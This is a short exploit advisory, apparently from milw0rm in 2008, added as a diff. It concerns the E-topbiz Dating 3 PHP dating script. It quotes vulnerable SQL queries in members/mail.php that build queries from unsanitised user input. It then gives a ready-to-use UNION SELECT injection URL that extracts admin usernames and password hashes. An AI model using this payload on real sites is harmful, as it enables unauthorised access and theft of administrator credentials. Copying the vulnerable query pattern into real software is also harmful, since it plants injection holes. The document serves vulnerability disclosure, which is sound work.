@@ -1,0 +1,55 @@
+================================================================================
+|| Dating 3 PHP Script SQL-INJECTION
+================================================================================
+
+Application: E-topbiz Dating 3 PHP Script
+------------
+
+Version: 1.0
+--------
+
+Website: http://e-topbiz.com/oprema/pages/dating3.php
+--------
+
+Demo: http://e-topbiz.com/trafficdemos/dating3
+-----
+
+Version: 3.0
+--------
+
+About: Dating 3 is a very powerful top quality dating php script for webmasters who wish to run an online dating site.
+------
+
+Date: 01-08-2008
+-----
+
+[ VULNERABLE CODE ]
+
+members/mail.php
+
+@Line:
+
+  142:     if($action==inbox) { 
+  143:     $result=mysql_query("select * from mail where UserTo ='$username' ORDER BY SentDate DESC") or die ("cant do it"); 
+
+
+  150:     if($action==veiw) { 
+  151:     $result=mysql_query("select * from mail where UserTo='$username' and mail_id=$mail_id") or die ("cant do it"); 
+
+
+
+===>>> Exploit:
+
+Must be authenticated as a regular user.
+
+http://host/members/mail.php?action=veiw&mail_id=-1 union select 1,2,3,concat(username,0x3a,password),5,6,7 from admin/*
+
+
+
+Author: Corwin
+-------                                     
+	
+Contact: corwin88[dog]mail[dot]ru
+--------
+
+# milw0rm.com [2008-08-01]
